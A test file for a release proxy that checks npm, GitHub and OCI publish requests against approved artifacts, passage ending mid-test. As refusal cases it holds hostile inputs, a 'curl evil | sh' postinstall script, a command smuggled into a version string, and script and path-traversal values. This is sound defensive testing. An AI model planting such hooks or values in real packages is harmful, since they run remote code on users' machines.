import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import { createHash, randomBytes } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { eq } from "drizzle-orm";
import { tarDirectory } from "@turntable/act-runner";
import { controlPost, type SafeFetch } from "@turntable/net";
import { checkBody, compileRules, matchRule } from "@turntable/proxy";
import { chainedAudit, createReleaseRequest, setFreeze, clearFreeze, type Db } from "../src/db";
import * as s from "../src/db/schema";
import { resetFailureThrottle } from "../src/audit/failures";
import { SecretVault } from "../src/secrets/vault";
import { AttestationStore } from "../src/release/attest";
import { compatRules, RELEASE_GITHUB_SECRET } from "../src/release/compat";
import { ReleaseLane, type ReleaseSigner } from "../src/release/lane";
import { parseTarget } from "../src/release/publish/config";
import { inspectNpmTarball, integrityOf } from "../src/release/publish/npm";
import type { PublishTarget } from "../src/release/publish/types";
import {
  channelMac,
  registerFields,
  startChannel,
  type RunningChannel,
} from "../src/release/channel";
import { createChannelClient, withReleaseChannel } from "../src/release/channel-client";
import { ReleaseProxy } from "../src/release/proxy";
import type { AttemptContext, AttemptOutcome } from "../src/scheduler/types";
import { releaseConfigFromEnv } from "../src/roles";
import { seedWorld, type Tenant } from "./ops-helpers";

const SHA = "b".repeat(40);
const TOKEN_NPM = ["npm", "publish", "token", "77ac10"].join("_");
const sha256 = (b: Uint8Array | string): string => createHash("sha256").update(b).digest("hex");
const tmp = mkdtempSync(join(tmpdir(), "ls-compat-"));
afterAll(() => rmSync(tmp, { recursive: true, force: true }));

async function tarball(
  pkg: Record<string, unknown>,
  files: Record<string, string> = {},
): Promise<Uint8Array> {
  const d = mkdtempSync(join(tmp, "pkg-"));
  mkdirSync(join(d, "package"));
  writeFileSync(join(d, "package", "package.json"), JSON.stringify(pkg));
  for (const [name, text] of Object.entries(files)) {
    mkdirSync(dirname(join(d, "package", name)), { recursive: true });
    writeFileSync(join(d, "package", name), text);
  }
  return tarDirectory(d, ["package"]);
}

const NPM: PublishTarget = {
  kind: "npm",
  mode: "compat",
  package: "@acme/web",
  artifact: "web-1.0.0.tgz",
  tag: "latest",
  access: "public",
  secret: "NPM_TOKEN",
};
const GH: PublishTarget = {
  kind: "github-release",
  mode: "compat",
  assets: ["cli-linux"],
  provenanceAsset: null,
};
const OCI: PublishTarget = {
  kind: "oci-image",
  mode: "compat",
  registry: "ghcr.io",
  repository: "acme/web",
  manifest: "manifest.json",
  tags: ["v1.0.0", "latest"],
  username: "bot",
  secret: "REGISTRY_TOKEN",
};
const rel = {
  repo: "acme/web",
  tag: "v1.0.0",
  digests: { "web-1.0.0.tgz": sha256("t"), "cli-linux": sha256("c"), "manifest.json": sha256("m") },
};

const PKG = { name: "@acme/web", version: "1.0.0", description: "a package", license: "MIT" };

/** The publish document `npm publish` would send for a tarball with this package.json. */
function publishDoc(
  tgz: Uint8Array,
  manifest: Record<string, unknown> = PKG,
  over: Record<string, unknown> = {},
): string {
  const bytes = Buffer.from(tgz);
  const version = String(manifest.version);
  return JSON.stringify({
    _id: "@acme/web",
    name: "@acme/web",
    description: manifest.description,
    "dist-tags": { latest: version },
    versions: {
      [version]: {
        ...manifest,
        _id: `@acme/web@${version}`,
        dist: {
          integrity: integrityOf(bytes),
          shasum: createHash("sha1").update(bytes).digest("hex"),
        },
      },
    },
    access: "public",
    _attachments: {
      [`@acme/web-${version}.tgz`]: {
        content_type: "application/octet-stream",
        data: bytes.toString("base64"),
        length: bytes.length,
      },
    },
    ...over,
  });
}

describe("rules for compat targets", () => {
  test("npm: the package path, the attested tarball and only that", () => {
    const rules = compatRules("npm", NPM, { ...rel, npmManifests: { "web-1.0.0.tgz": PKG } });
    expect(rules).toHaveLength(1);
    expect(rules[0]).toMatchObject({
      host: "registry.npmjs.org",
      npmPackage: "@acme/web",
      pathPrefix: "/@acme%2Fweb",
      secret: "NPM_TOKEN",
      bodyCheck: {
        type: "npm-publish",
        digests: [rel.digests["web-1.0.0.tgz"]],
        expect: {
          name: "@acme/web",
          version: "1.0.0",
          tag: "latest",
          access: "public",
          manifest: PKG,
        },
      },
    });
    // no verified manifest, no npm rule
    expect(compatRules("npm", NPM, rel)).toEqual([]);
    expect(() => compileRules(rules)).not.toThrow();
  });

  test("github: read, and upload to the one draft the lane created; no create, no edit", () => {
    const rules = compatRules("gh", GH, { ...rel, githubDraftId: 101 });
    expect(rules.map((r) => `${r.host} ${r.methods.join(",")} ${r.pathPrefix}`)).toEqual([
      "api.github.com GET /repos/acme/web/releases",
      "uploads.github.com POST /repos/acme/web/releases/101/assets",
    ]);
    expect(rules.every((r) => r.secret === RELEASE_GITHUB_SECRET)).toBe(true);
    expect(rules[1]).toMatchObject({ pathExact: true });
    expect(() => compileRules(rules)).not.toThrow();
    // no draft, no rules
    expect(compatRules("gh", GH, rel)).toEqual([]);
  });

  test("oci: ping, anchored blob and manifest endpoints, and a manifest write only for the attested digest under the approved references", () => {
    // A mutable tag (latest) is only for the project's newest approved release.
    const rules = compatRules("img", OCI, { ...rel, newest: true });
    expect(() => compileRules(rules)).not.toThrow();
    const writes = rules.filter((r) => r.methods.includes("PUT") && r.id.includes("manifest-"));
    expect(writes.map((r) => r.pathPrefix)).toEqual([
      "/v2/acme/web/manifests/v1.0.0",
      "/v2/acme/web/manifests/latest",
      `/v2/acme/web/manifests/sha256:${rel.digests["manifest.json"]}`,
    ]);
    for (const w of writes) {
      expect(w.pathExact).toBe(true);
      expect(w.bodyCheck).toEqual({ type: "sha256", digests: [rel.digests["manifest.json"]] });
    }
    expect(rules.every((r) => r.pathPrefix.startsWith("/v2/"))).toBe(true);
    expect(rules.some((r) => r.methods.includes("DELETE"))).toBe(false);
  });

  test("oci: a release that is not the newest may not move a mutable tag", () => {
    for (const newest of [false, undefined]) {
      const rules = compatRules("img", OCI, { ...rel, newest });
      const writes = rules.filter((r) => r.methods.includes("PUT") && r.id.includes("manifest-"));
      expect(writes.map((r) => r.pathPrefix)).toEqual([
        "/v2/acme/web/manifests/v1.0.0",
        `/v2/acme/web/manifests/sha256:${rel.digests["manifest.json"]}`,
      ]);
    }
  });

  test("oci: the rules match the registry endpoints and not a longer path that merely starts like one", () => {
    const rules = compileRules(compatRules("img", OCI, { ...rel, newest: true }));
    const allowed = (method: string, path: string) =>
      matchRule(rules, OCI.registry, 443, method, path).ok;
    const D = `sha256:${"a".repeat(64)}`;
    // the real endpoints
    expect(allowed("GET", "/v2/")).toBe(true);
    expect(allowed("POST", "/v2/acme/web/blobs/uploads/")).toBe(true);
    expect(allowed("PATCH", "/v2/acme/web/blobs/uploads/0b9d2f")).toBe(true);
    expect(allowed("PUT", "/v2/acme/web/blobs/uploads/0b9d2f")).toBe(true);
    expect(allowed("GET", `/v2/acme/web/blobs/${D}`)).toBe(true);
    expect(allowed("HEAD", `/v2/acme/web/blobs/${D}`)).toBe(true);
    expect(allowed("GET", "/v2/acme/web/manifests/latest")).toBe(true);
    expect(allowed("HEAD", `/v2/acme/web/manifests/${D}`)).toBe(true);
    // a repository whose name only starts with the approved one: <repo>/blobs/x is another repo
    expect(allowed("GET", "/v2/acme/web/blobs/x/manifests/latest")).toBe(false);
    expect(allowed("PUT", "/v2/acme/web/blobs/x/manifests/latest")).toBe(false);
    expect(allowed("PUT", "/v2/acme/web/blobs/x/blobs/uploads/abc")).toBe(false);
    expect(allowed("POST", "/v2/acme/web/blobs/x/blobs/uploads/")).toBe(false);
    expect(allowed("GET", `/v2/acme/web/blobs/x/blobs/${D}`)).toBe(false);
    expect(allowed("GET", "/v2/acme/web/manifests/x/manifests/latest")).toBe(false);
    // shapes: the upload session is one segment, a blob read is a digest, a manifest is one segment
    expect(allowed("PATCH", "/v2/acme/web/blobs/uploads/a/b")).toBe(false);
    expect(allowed("PUT", "/v2/acme/web/blobs/uploads/")).toBe(false);
    expect(allowed("POST", "/v2/acme/web/blobs/uploads/0b9d2f")).toBe(false);
    expect(allowed("GET", "/v2/acme/web/blobs/latest")).toBe(false);
    expect(allowed("GET", `/v2/acme/web/blobs/sha256:${"a".repeat(63)}`)).toBe(false);
    expect(allowed("GET", `/v2/acme/web/blobs/${D}/extra`)).toBe(false);
    expect(allowed("GET", "/v2/acme/web/manifests/a/b")).toBe(false);
    expect(allowed("GET", "/v2/acme/web/manifests/")).toBe(false);
    // methods stay narrow
    expect(allowed("DELETE", `/v2/acme/web/blobs/${D}`)).toBe(false);
    expect(allowed("PUT", `/v2/acme/web/blobs/${D}`)).toBe(false);
    expect(allowed("PUT", "/v2/acme/web/manifests/other")).toBe(false);
  });

  test("oci: a named token host is carried into the rules, and only then", () => {
    // without realmHost no rule carries one; with it, every rule does, including the anchored ones
    const plain = compatRules("img", OCI, rel);
    expect(plain.length).toBeGreaterThan(5);
    for (const r of plain) expect(r.inject).not.toHaveProperty("realmHost");
    const hub = compatRules("img", { ...OCI, realmHost: "auth.docker.io" } as PublishTarget, rel);
    expect(
      hub.every((r) => r.inject.type === "oci-bearer" && r.inject.realmHost === "auth.docker.io"),
    ).toBe(true);
    expect(() => compileRules(hub)).not.toThrow();
  });

  test("strict targets and unattested artifacts give no rules", () => {
    expect(compatRules("npm", { ...NPM, mode: "strict" } as PublishTarget, rel)).toEqual([]);
    expect(compatRules("npm", NPM, { ...rel, digests: {} })).toEqual([]);
    expect(compatRules("img", OCI, { ...rel, digests: {} })).toEqual([]);
  });

  test("declarations: mode and image fields are validated", () => {
    expect(parseTarget({ ...NPM, mode: undefined })).toMatchObject({ mode: "strict" });
    expect(() => parseTarget({ ...NPM, mode: "other" })).toThrow();
    expect(parseTarget(OCI)).toMatchObject({ kind: "oci-image", mode: "compat" });
    for (const bad of [
      { ...OCI, mode: "strict" },
      { ...OCI, registry: "GHCR.io" },
      { ...OCI, repository: "Acme/Web" },
      { ...OCI, tags: [] },
      { ...OCI, tags: ["bad tag"] },
      { ...OCI, username: "a:b" },
      { ...OCI, manifest: "../m" },
    ]) {
      expect(() => parseTarget(bad)).toThrow();
    }
  });
});

describe("the npm document a job may send", () => {
  let tgz: Uint8Array;
  const check = (doc: string, over: Record<string, unknown> = {}) => {
    const [rule] = compatRules("npm", NPM, {
      ...rel,
      digests: { ...rel.digests, "web-1.0.0.tgz": sha256(tgz) },
      npmManifests: { "web-1.0.0.tgz": PKG },
      npmReadmes: { "web-1.0.0.tgz": { "README.md": "# web\n", README: "plain readme\n" } },
      sha: SHA,
      ...over,
    });
    return checkBody(rule!.bodyCheck!, Buffer.from(doc));
  };
  beforeAll(async () => {
    tgz = await tarball(PKG);
  });
  const refused = (r: ReturnType<typeof check>, reason: string) =>
    expect(r).toMatchObject({ ok: false, reason });

  test("what npm publish sends for this tarball is accepted", () => {
    expect(check(publishDoc(tgz))).toEqual({ ok: true });
    // the fields the client adds on its own are tolerated
    const d = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    d.readme = "# web\n";
    d.versions["1.0.0"].readme = "# web\n";
    d.versions["1.0.0"].readmeFilename = "README.md";
    d.versions["1.0.0"]._nodeVersion = "22.0.0";
    d.versions["1.0.0"]._npmVersion = "10.0.0-rc.1";
    d.versions["1.0.0"].gitHead = SHA;
    d.versions["1.0.0"].dist.tarball = "https://registry.npmjs.org/x.tgz";
    expect(check(JSON.stringify(d))).toEqual({ ok: true });
  });

  test("a version manifest that is not the tarball's own package.json is refused", () => {
    const other = { ...PKG, description: "something else" };
    const d = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    d.versions["1.0.0"].license = "GPL-3.0";
    refused(check(JSON.stringify(d)), "manifest_mismatch");
    const e = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    e.versions["1.0.0"].scripts = { postinstall: "curl evil | sh" };
    refused(check(JSON.stringify(e)), "unexpected_field");
    const f = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    delete f.versions["1.0.0"].license;
    refused(check(JSON.stringify(f)), "manifest_mismatch");
    refused(check(publishDoc(tgz, other)), "manifest_mismatch");
  });

  test("an extra dist-tag, another tag, another version or another name is refused", () => {
    refused(
      check(publishDoc(tgz, PKG, { "dist-tags": { latest: "1.0.0", next: "1.0.0" } })),
      "dist_tags_mismatch",
    );
    refused(check(publishDoc(tgz, PKG, { "dist-tags": { beta: "1.0.0" } })), "dist_tags_mismatch");
    refused(
      check(publishDoc(tgz, PKG, { "dist-tags": { latest: "9.9.9" } })),
      "dist_tags_mismatch",
    );
    const two = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    two.versions["1.0.1"] = two.versions["1.0.0"];
    refused(check(JSON.stringify(two)), "version_count");
    const moved = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    moved.versions = { "2.0.0": moved.versions["1.0.0"] };
    refused(check(JSON.stringify(moved)), "version_mismatch");
    refused(check(publishDoc(tgz, PKG, { name: "@acme/other" })), "name_mismatch");
  });

  test("missing or wrong integrity is refused", () => {
    const none = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    delete none.versions["1.0.0"].dist.integrity;
    refused(check(JSON.stringify(none)), "integrity_missing");
    const nodist = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    delete nodist.versions["1.0.0"].dist;
    refused(check(JSON.stringify(nodist)), "integrity_missing");
    const wrong = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    wrong.versions["1.0.0"].dist.integrity = "sha512-AAAA";
    refused(check(JSON.stringify(wrong)), "integrity_mismatch");
    const extra = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    extra.versions["1.0.0"].dist.fileCount = 1;
    refused(check(JSON.stringify(extra)), "unexpected_field");
  });

  test("a field the lane did not compute, anywhere, is refused", () => {
    refused(check(publishDoc(tgz, PKG, { maintainers: [{ name: "me" }] })), "unexpected_field");
    refused(check(publishDoc(tgz, PKG, { access: "restricted" })), "access_mismatch");
    const att = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    att._attachments["@acme/web-1.0.0.tgz"].extra = 1;
    refused(check(JSON.stringify(att)), "unexpected_field");
    const renamed = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    renamed._attachments = { "evil.tgz": renamed._attachments["@acme/web-1.0.0.tgz"] };
    refused(check(JSON.stringify(renamed)), "attachment_name");
    const len = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    len._attachments["@acme/web-1.0.0.tgz"].length = 3;
    refused(check(JSON.stringify(len)), "attachment_length");
  });

  const doc = (edit: (d: Record<string, any>) => void): string => {
    const d = JSON.parse(publishDoc(tgz)) as Record<string, any>;
    edit(d);
    return JSON.stringify(d);
  };

  test("a readme is empty or exactly a README file of the tarball, never other text", () => {
    refused(
      check(doc((d) => (d.readme = "# buy my coin, visit evil.example"))),
      "readme_not_from_tarball",
    );
    refused(
      check(doc((d) => (d.versions["1.0.0"].readme = "<script>x</script>"))),
      "readme_not_from_tarball",
    );
    refused(check(doc((d) => (d.readme = 5))), "readme_not_from_tarball");
    // a prefix or a lightly edited copy is not the file
    refused(check(doc((d) => (d.readme = "# web"))), "readme_not_from_tarball");
    expect(check(doc((d) => (d.readme = "")))).toEqual({ ok: true });
    expect(check(doc((d) => (d.versions["1.0.0"].readme = "")))).toEqual({ ok: true });
    expect(check(doc((d) => (d.readme = "# web\n")))).toEqual({ ok: true });
    // either README the tarball carries is acceptable (the client picks one)
    expect(check(doc((d) => (d.versions["1.0.0"].readme = "plain readme\n")))).toEqual({
      ok: true,
    });
    // a tarball with no README allows only an empty readme
    const none = { npmReadmes: { "web-1.0.0.tgz": {} } };
    refused(
      check(
        doc((d) => (d.readme = "# web\n")),
        none,
      ),
      "readme_not_from_tarball",
    );
    expect(
      check(
        doc((d) => (d.readme = "")),
        none,
      ),
    ).toEqual({ ok: true });
  });

  test("readmeFilename names a README of the tarball and matches the readme it goes with", () => {
    refused(
      check(doc((d) => (d.versions["1.0.0"].readmeFilename = "evil.md"))),
      "readme_filename_mismatch",
    );
    refused(
      check(doc((d) => (d.versions["1.0.0"].readmeFilename = "../README.md"))),
      "readme_filename_mismatch",
    );
    refused(
      check(
        doc((d) => {
          d.versions["1.0.0"].readmeFilename = "README";
          d.versions["1.0.0"].readme = "# web\n";
        }),
      ),
      "readme_filename_mismatch",
    );
    expect(
      check(
        doc((d) => {
          d.versions["1.0.0"].readmeFilename = "README.md";
          d.versions["1.0.0"].readme = "# web\n";
        }),
      ),
    ).toEqual({ ok: true });
    expect(check(doc((d) => (d.versions["1.0.0"].readmeFilename = "README")))).toEqual({
      ok: true,
    });
  });

  test("gitHead is absent or the approved tag's commit", () => {
    refused(check(doc((d) => (d.versions["1.0.0"].gitHead = "c".repeat(40)))), "git_head_mismatch");
    refused(check(doc((d) => (d.versions["1.0.0"].gitHead = ""))), "git_head_mismatch");
    expect(check(doc((d) => (d.versions["1.0.0"].gitHead = SHA)))).toEqual({ ok: true });
    // with no known commit, no gitHead is accepted at all
    refused(
      check(
        doc((d) => (d.versions["1.0.0"].gitHead = SHA)),
        { sha: undefined },
      ),
      "git_head_mismatch",
    );
  });

  test("_nodeVersion and _npmVersion are semver-shaped and nothing else", () => {
    for (const k of ["_nodeVersion", "_npmVersion"]) {
      for (const bad of [
        "latest",
        "1.0",
        "1.0.0; curl evil | sh",
        "v22.0.0",
        22,
        "",
        "1.0.0 <script>",
      ]) {
        refused(check(doc((d) => (d.versions["1.0.0"][k] = bad))), "client_version_malformed");
      }
      for (const good of ["22.1.0", "10.9.2", "11.0.0-beta.1", "1.2.3+build.5"]) {
        expect(check(doc((d) => (d.versions["1.0.0"][k] = good)))).toEqual({ ok: true });
      }
    }
  });

  test("_id is exactly <name>@<version>", () => {
    refused(check(doc((d) => (d.versions["1.0.0"]._id = "@acme/web@1.0.1"))), "manifest_mismatch");
    refused(
      check(doc((d) => (d.versions["1.0.0"]._id = "@acme/other@1.0.0"))),
      "manifest_mismatch",
    );
    refused(check(doc((d) => (d._id = "@acme/other"))), "name_mismatch");
    expect(check(doc((d) => (d.versions["1.0.0"]._id = "@acme/web@1.0.0")))).toEqual({ ok: true });
  });

  test("the lane reads the README files from the tarball itself, top level only", async () => {
    const t = await tarball(PKG, {
      "README.md": "# real\n",
      readme: "lower\n",
      "docs/README.md": "# nested\n",
      "READMEFIRST.txt": "no\n",
    });
    const r = inspectNpmTarball(t, "@acme/web", "v1.0.0");
    expect(r.ok && r.readmes).toEqual({ "README.md": "# real\n", readme: "lower\n" });
  });

  test("other bytes are still refused first", async () => {
    const evil = await tarball({ ...PKG, evil: true });
    refused(check(publishDoc(evil)), "digest_not_approved");
  });
});

describe("the release proxy", () => {
  let db: Db;
  let a: Tenant;
  let attest: AttestationStore;
  let vault: SecretVault;
  let blobs: Map<string, Uint8Array>;
  let npmTar: Uint8Array;
  let tagSha = SHA;
  let proxy: ReleaseProxy | undefined;
  let seen: { url: string; method: string; auth: string; body: string }[];

  const signer: ReleaseSigner = {
    async signRelease(_s, req) {
      return {
        ok: true,
        envelope: { payloadType: "x", payload: "eA==", signatures: [{ keyid: "k", sig: "eQ==" }] },
        keyid: "k",
        subjects: req.verified.subjects.map((x) => ({ ...x })),
      };
    },
  };
  const upstream: SafeFetch = async (input, init) => {
    const h = new Headers(init?.headers);
    const body = init?.body ? Buffer.from(init.body as Uint8Array).toString() : "";
    seen.push({
      url: String(input),
      method: init?.method ?? "GET",
      auth: h.get("authorization") ?? "",
      body,
    });
    return new Response("{}", { status: 201 });
  };
  const makeLane = () =>
    new ReleaseLane({
      db,
      forge: { tagCommit: async () => ({ found: true, sha: tagSha }) },
      bytes: { read: async (_r, n) => blobs.get(n) },
      records: {
        async recorded(_s, _r, names) {
          return names.map((n) => ({ name: n, sha256: sha256(blobs.get(n)!) }));
        },
      },
      attest,
      signer,
      owner: "lane-1",
      now: () => Date.now(),
    });
  const startProxy = async () =>
    ReleaseProxy.start({
      db,
      vault,
      attest,
      bytes: { read: async (_r, n) => blobs.get(n) },
      forge: { tagCommit: async () => ({ found: true, sha: tagSha }) },
      githubToken: async () => undefined,
      upstream,
    });
  const sign = async () => {
    await createReleaseRequest(db, a.scope, {
      runId: a.runId,
      tag: "v1.0.0",
      artifacts: ["web-1.0.0.tgz"],
      requestedBy: "t",
    });
    expect(await makeLane().processNext()).toBe(true);
  };
  const reg = (attemptId = "att-1") =>
    proxy!.register({
      orgId: a.orgId,
      projectId: a.projectId,
      runId: a.runId,
      jobId: a.jobId,
      attemptId,
      ttlMs: 60_000,
    });
  const outcomes = async () =>
    (await chainedAudit(db, a.orgId, 0, 500)).map((r) => `${r.op}:${r.outcome}`);

  beforeEach(async () => {
    ({ db, a } = await seedWorld());
    resetFailureThrottle();
    tagSha = SHA;
    seen = [];
    npmTar = await tarball(PKG);
    blobs = new Map([["web-1.0.0.tgz", npmTar]]);
    attest = new AttestationStore(":memory:");
    attest.pinRepo(a.orgId, a.projectId, "acme/web", 0);
    attest.setPublishTarget(a.orgId, a.projectId, "npm", NPM, 0);
    const masterKey = randomBytes(32);
    await new SecretVault({ db, masterKey }).set(a.orgId, "t", { name: "NPM_TOKEN" }, TOKEN_NPM, {
      destinations: ["registry.npmjs.org"],
      trustClasses: ["release"],
    });
    vault = new SecretVault({ db, masterKey, lane: "release" });
    await db.orm
      .update(s.runs)
      .set({ repo: "acme/web", ref: "refs/tags/v1.0.0", sha: SHA, status: "success" })
      .where(eq(s.runs.id, a.runId));
    proxy = await startProxy();
  });
  afterEach(async () => {
    await proxy?.stop();
    await clearFreeze(db, a.scope).catch(() => {});
    attest.close();
  });

  test("a run the lane never signed gets nothing", async () => {
    expect(await reg()).toEqual({ ok: false, reason: "not_approved" });
    expect(await outcomes()).toContain("release_proxy_register:refused:not_approved");
  });

  test("a signed release gets the project's compat rules, from the lane's own file", async () => {
    await sign();
    const r = await reg();
    expect(r).toMatchObject({ ok: true, rules: ["npm:npm"] });
    expect(await outcomes()).toContain("release_proxy_register:ok");
    expect(proxy!.active).toBe(1);
  });

  test("refused when the tag moved, the repo pin changed, a freeze is on, or nothing is compat", async () => {
    await sign();
    tagSha = "c".repeat(40);
    expect(await reg("a1")).toEqual({ ok: false, reason: "tag_moved" });
    tagSha = SHA;
    attest.pinRepo(a.orgId, a.projectId, "acme/other", 0);
    expect(await reg("a2")).toEqual({ ok: false, reason: "repo_mismatch" });
    attest.pinRepo(a.orgId, a.projectId, "acme/web", 0);
    await setFreeze(db, a.scope, { by: "t", reason: "incident", now: 1 });
    expect(await reg("a3")).toEqual({ ok: false, reason: "frozen" });
    await clearFreeze(db, a.scope);
    attest.removePublishTarget(a.orgId, a.projectId, "npm");
    attest.setPublishTarget(
      a.orgId,
      a.projectId,
      "npm",
      { ...NPM, mode: "strict" } as PublishTarget,
      0,
    );
    expect(await reg("a4")).toEqual({ ok: false, reason: "no_compat_targets" });
    expect(proxy!.active).toBe(0);
  });

  test("an approval expires: inside its window it registers, after it does not", async () => {
    await sign();
    expect((await reg("w1")).ok).toBe(true);
    // the same run approved long ago, with the default window: over
    const id = { orgId: a.orgId, projectId: a.projectId, runId: a.runId };
    attest.approveRelease(
      id,
      { repo: "acme/web", tag: "v1.0.0", sha: SHA, artifacts: ["web-1.0.0.tgz"] },
      Date.now() - 7 * 3_600_000,
    );
    expect(await reg("w2")).toEqual({ ok: false, reason: "approval_expired" });
    expect(await outcomes()).toContain("release_proxy_register:refused:approval_expired");
    // a short window set at approval time ends sooner
    attest.approveRelease(
      id,
      { repo: "acme/web", tag: "v1.0.0", sha: SHA, artifacts: ["web-1.0.0.tgz"] },
      Date.now() - 2_000,
      1_000,
    );
    expect(await reg("w3")).toEqual({ ok: false, reason: "approval_expired" });
  });

  test("a finalized release cannot be registered again, even inside its window", async () => {
    await sign();
    const lane = makeLane();
    expect((await reg("f1")).ok).toBe(true);
    const done = await lane.finalize({ orgId: a.orgId, projectId: a.projectId, runId: a.runId });
    // nothing was published by the job in this fixture, so finalize may have had work to do;
    // what matters is that a finished release is closed
    attest.markFinalized({ orgId: a.orgId, projectId: a.projectId, runId: a.runId }, Date.now());
    expect(await reg("f2")).toEqual({ ok: false, reason: "already_finalized" });
    expect(done).toBeDefined();
    // signing the same run again does not reopen it
    attest.approveRelease(
      { orgId: a.orgId, projectId: a.projectId, runId: a.runId },
      { repo: "acme/web", tag: "v1.0.0", sha: SHA, artifacts: ["web-1.0.0.tgz"] },
      Date.now() + 1000,
    );
    expect(await reg("f3")).toEqual({ ok: false, reason: "already_finalized" });
  });

  test("an older approved release cannot be registered once a newer one exists (no rolling a name back)", async () => {
    await sign();
    const mine = { orgId: a.orgId, projectId: a.projectId, runId: a.runId };
    expect(attest.isNewestApproved(mine)).toBe(true);
    // a later approval of another run of the same project
    attest.approveRelease(
      { orgId: a.orgId, projectId: a.projectId, runId: "later-run" },
      { repo: "acme/web", tag: "v2.0.0", sha: "d".repeat(40), artifacts: ["web-2.0.0.tgz"] },
      Date.now() + 5_000,
    );
    expect(attest.isNewestApproved(mine)).toBe(false);
    expect(await reg("s1")).toEqual({ ok: false, reason: "superseded" });
    // another project's approvals are not in the order
    attest.approveRelease(
      { orgId: a.orgId, projectId: "other-project", runId: "x" },
      { repo: "acme/x", tag: "v9", sha: "e".repeat(40), artifacts: ["x"] },
      Date.now() + 9_000,
    );
    expect(
      attest.isNewestApproved({ orgId: a.orgId, projectId: "other-project", runId: "x" }),
    ).toBe(true);
  });

  test("re-signing an older release does not make it newest again: its mutable tag stays refused", async () => {
    await sign();
    const A = { orgId: a.orgId, projectId: a.projectId, runId: a.runId };
    const B = { orgId: a.orgId, projectId: a.projectId, runId: "run-b" };
    const info = { repo: "acme/web", sha: SHA, artifacts: ["web-1.0.0.tgz"] };
    attest.approveRelease(B, { ...info, tag: "v2.0.0" }, Date.now() + 1_000);
    expect(attest.isNewestApproved(A)).toBe(false);
    const before = attest.approvedRelease(A)!;
    // sign A again, later: nothing about A moves, B stays newest
    expect(attest.approveRelease(A, { ...info, tag: "v1.0.0" }, Date.now() + 60_000)).toBe(false);
    const after = attest.approvedRelease(A)!;
    expect(after.approvedAt).toBe(before.approvedAt);
    expect(after.expiresAt).toBe(before.expiresAt); // the window is not extended either
    expect(attest.isNewestApproved(A)).toBe(false);
    expect(attest.isNewestApproved(B)).toBe(true);
    expect(await reg("r1")).toEqual({ ok: false, reason: "superseded" });
    // the lane signing A again through the real path changes nothing either
    await sign();
    expect(attest.isNewestApproved(A)).toBe(false);
    expect(await reg("r2")).toEqual({ ok: false, reason: "superseded" });
    // and the rules it would have got carry no mutable tag
    const rules = compatRules("img", OCI, { ...rel, newest: attest.isNewestApproved(A) });
    expect(rules.some((r) => r.pathPrefix.endsWith("/manifests/latest"))).toBe(false);
  });

  test("a registration never outlives its approval", async () => {
    await sign();
    const id = { orgId: a.orgId, projectId: a.projectId, runId: a.runId };
    attest.approveRelease(
      id,
      { repo: "acme/web", tag: "v1.0.0", sha: SHA, artifacts: ["web-1.0.0.tgz"] },
      Date.now(),
      30_000,
    );
    // approveRelease on an open, newest, unfinalized run refreshes the window to 30 s
    const approvedUntil = attest.approvedRelease(id)!.expiresAt;
    const r = await reg("t1");
    if (!r.ok) throw new Error("not registered");
    expect(r.credential.expiresAt).toBeLessThanOrEqual(approvedUntil + 50); // not the 60 s asked for
    expect(r.credential.expiresAt).toBeLessThan(Date.now() + 31_000);
  });

  test("finalizing a release, or approving a newer one, ends the live registration at once and on the next request", async () => {
    // finalized
    await sign();
    const r = await reg("g1");
    if (!r.ok) throw new Error("not registered");
    const viaProxy = (cred: typeof r, b: string) =>
      fetch("https://registry.npmjs.org/@acme%2Fweb", {
        method: "PUT",
        body: b,
        headers: { "content-type": "application/json" },
        proxy: cred.credential.proxyUrl(cred.listen.host, cred.listen.port),
        tls: { ca: cred.credential.caPem },
      });
    const id = { orgId: a.orgId, projectId: a.projectId, runId: a.runId };
    attest.markFinalized(id, Date.now());
    // the next request is refused, with the refusal written to the job (not a reset), and nothing
    // is sent upstream, even before any sweep
    const denied = await viaProxy(r, publishDoc(npmTar));
    expect(denied.status).not.toBe(201);
    expect(denied.status).toBe(502); // the proxy's refusal, written to the job: not a reset
    expect(seen).toHaveLength(0);
    expect(await outcomes()).toContain("release_proxy_refuse:release_finalized");
    // the registration ends when the sweep runs, never from inside the refused request
    expect(proxy!.active).toBe(1);
    expect(await proxy!.sweepApprovals()).toBe(1);
    expect(proxy!.active).toBe(0);
    expect(await outcomes()).toContain("release_proxy_revoke:release_finalized");
  });

  test("a newer approval revokes live registrations: by sweep, and on the next request", async () => {
    await sign();
    const r1 = await reg("n1");
    const r2 = await reg("n2");
    if (!r1.ok || !r2.ok) throw new Error("not registered");
    expect(proxy!.active).toBe(2);
    attest.approveRelease(
      { orgId: a.orgId, projectId: a.projectId, runId: "newer" },
      { repo: "acme/web", tag: "v2.0.0", sha: SHA, artifacts: ["web-1.0.0.tgz"] },
      Date.now() + 1_000,
    );
    // a request on one is refused (the reason is written to the job), and nothing is sent
    const viaProxy = (cred: typeof r1) =>
      fetch("https://registry.npmjs.org/@acme%2Fweb", {
        method: "PUT",
        body: publishDoc(npmTar),
        headers: { "content-type": "application/json" },
        proxy: cred.credential.proxyUrl(cred.listen.host, cred.listen.port),
        tls: { ca: cred.credential.caPem },
      });
    const denied = await viaProxy(r1);
    expect(denied.status).toBe(502);
    expect(seen).toHaveLength(0);
    expect(await outcomes()).toContain("release_proxy_refuse:superseded");
    expect(proxy!.active).toBe(2); // refusing does not close anything
    // the sweep ends both, the one that was refused and the one nobody used
    expect(await proxy!.sweepApprovals()).toBe(2);
    expect(proxy!.active).toBe(0);
    expect(await outcomes()).toContain("release_proxy_revoke:superseded");
  });

  test("a job publishes the approved tarball through the proxy and never holds the token", async () => {
    await sign();
    const r = await reg();
    if (!r.ok) throw new Error("not registered");
